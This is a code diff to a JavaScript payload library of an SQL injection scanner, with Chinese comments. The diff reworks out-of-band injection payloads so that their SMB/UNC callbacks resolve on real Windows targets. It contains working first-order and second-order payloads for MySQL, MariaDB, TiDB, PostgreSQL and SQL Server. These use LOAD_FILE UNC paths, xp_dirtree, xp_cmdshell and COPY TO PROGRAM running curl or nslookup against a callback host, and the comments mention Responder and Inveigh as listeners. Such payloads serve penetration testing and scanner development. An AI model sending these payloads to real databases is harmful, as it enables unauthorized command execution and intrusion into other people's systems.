@@ -92,25 +92,32 @@ CLAUSE_PAYLOADS.TiDB = CLAUSE_PAYLOADS.MySQL;
 CLAUSE_PAYLOADS.DM8 = CLAUSE_PAYLOADS.Oracle;
 
 // ==================== OOB 带外触发语句（技术名 'oob'，无回显盲注兜底） ====================
-// 占位符：{ORIG}=原始值；{CALLBACK}=拼接后的带外回调地址（callbackBase/oob/:token）。
+// 占位符：{ORIG}=原始值；{CALLBACK}=HTTP 回调地址（callbackBase/oob/:token，带端口，
+// 由内置 HTTP 接收端收回）；{UNC}=SMB/UNC 回调路径的 host\share 部分（裸主机名【不带
+// 端口】——Windows UNC/SMB 主机位不含 :port，带端口在真实目标上永远解析不了），
+// 由 OobDetector 派生为 <host>\oob\<token>，token 在 share 名里供外部 SMB 监听捕获。
 // 由各库触发 DBMS 主动回连（MySQL LOAD_FILE/UNC、PostgreSQL COPY PROGRAM、
 // SQL Server xp_dirtree、Oracle UTL_HTTP 等），目标回连即确认注入。
 // 注：SQLite 无原生带外能力，留空不投放。
+// ⚠ 通道边界（2026-10-02 实战分析 P1 修正）：UNC/SMB 类向量（MySQL/MariaDB/TiDB
+// LOAD_FILE、SQL Server xp_dirtree）的回连走「目标 → 本机 445 端口」的 SMB，内置接收端
+// 只监听 HTTP+DNS，**捕获不到 SMB 握手**——要么配 oob.dnsOob 走 DNS 通道（token 进
+// 子域名），要么自备外部 SMB 监听（Responder/Inveigh）读 share 名里的 token。
 export const OOB_PAYLOADS = {
   MySQL: [
-    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
-    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{UNC}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{UNC}')))-- -",
   ],
   MariaDB: [
-    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
-    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{UNC}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{UNC}')))-- -",
   ],
   PostgreSQL: [
     "{ORIG}'; COPY (SELECT '') TO PROGRAM 'curl {CALLBACK}'-- -",
     "{ORIG}' AND 1=1; COPY (SELECT 1) TO PROGRAM 'nslookup {CALLBACK}'-- -",
   ],
   'SQL Server': [
-    "{ORIG}'; EXEC master..xp_dirtree '\\\\{CALLBACK}'-- -",
+    "{ORIG}'; EXEC master..xp_dirtree '\\\\{UNC}'-- -",
     "{ORIG}'; EXEC master..xp_cmdshell 'ping -n 1 {CALLBACK}'-- -",
   ],
   Oracle: [
@@ -120,8 +127,8 @@ export const OOB_PAYLOADS = {
   SQLite: [], // SQLite 无原生带外能力，不投放 OOB
   // TiDB：MySQL 协议兼容，复用 MySQL OOB 模板（UNC/LOAD_FILE 回连）
   TiDB: [
-    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
-    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{UNC}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{UNC}')))-- -",
   ],
   // DM8：Oracle 兼容模式，复用 Oracle OOB 模板（UTL_HTTP 回连，需对应权限）
   DM8: [
@@ -471,25 +478,27 @@ export const SECOND_ORDER_PROBES = [
 ];
 
 // 二阶注入 OOB 触发探针（存储值被读出后重新拼入查询，触发数据库带外回连以确认"无回显二阶注入"）。
-// 占位符：{ORIG}=存储点原始值；{CALLBACK}=带外回调地址（callbackBase/oob/:token）。
+// 占位符：{ORIG}=存储点原始值；{CALLBACK}=HTTP 回调地址（callbackBase/oob/:token）；
+// {UNC}=SMB/UNC 裸主机回调路径（<host>\oob\<token>，与一阶 OOB_PAYLOADS 同批修正——
+// Windows UNC 主机位不含 :port，带端口在真实目标上永远解析不了）。
 // 与一阶 OOB_PAYLOADS 区别：二阶探针需"闭合字符串上下文后追加带外语句"（存储值会被拼进
 // 目标后续读出的 SQL，如 WHERE col='{stored}'），故每条均以闭合引号开头、-- - 注释结尾。
 // 无可靠 OOB 原语的库（SQLite/ClickHouse/DB2/Sybase/Firebird/Informix/H2）留空，检测器回退跳过。
 export const SECOND_ORDER_OOB_PROBES = {
   MySQL: [
-    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
-    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{UNC}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{UNC}')))-- -",
   ],
   MariaDB: [
-    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
-    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{UNC}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{UNC}')))-- -",
   ],
   PostgreSQL: [
     "{ORIG}'; COPY (SELECT '') TO PROGRAM 'curl {CALLBACK}'-- -",
     "{ORIG}'; COPY (SELECT 1) TO PROGRAM 'nslookup {CALLBACK}'-- -",
   ],
   'SQL Server': [
-    "{ORIG}'; EXEC master..xp_dirtree '\\\\{CALLBACK}'-- -",
+    "{ORIG}'; EXEC master..xp_dirtree '\\\\{UNC}'-- -",
     "{ORIG}'; EXEC master..xp_cmdshell 'ping -n 1 {CALLBACK}'-- -",
   ],
   Oracle: [
@@ -498,8 +507,8 @@ export const SECOND_ORDER_OOB_PROBES = {
   ],
   // TiDB：MySQL 协议兼容，复用 MySQL 二阶 OOB 模板（UNC/LOAD_FILE 回连）
   TiDB: [
-    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
-    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
+    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{UNC}'), 0x5c78))-- -",
+    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{UNC}')))-- -",
   ],
   // DM8：Oracle 兼容模式，复用 Oracle 二阶 OOB 模板（UTL_HTTP 回连，需对应权限）
   DM8: [
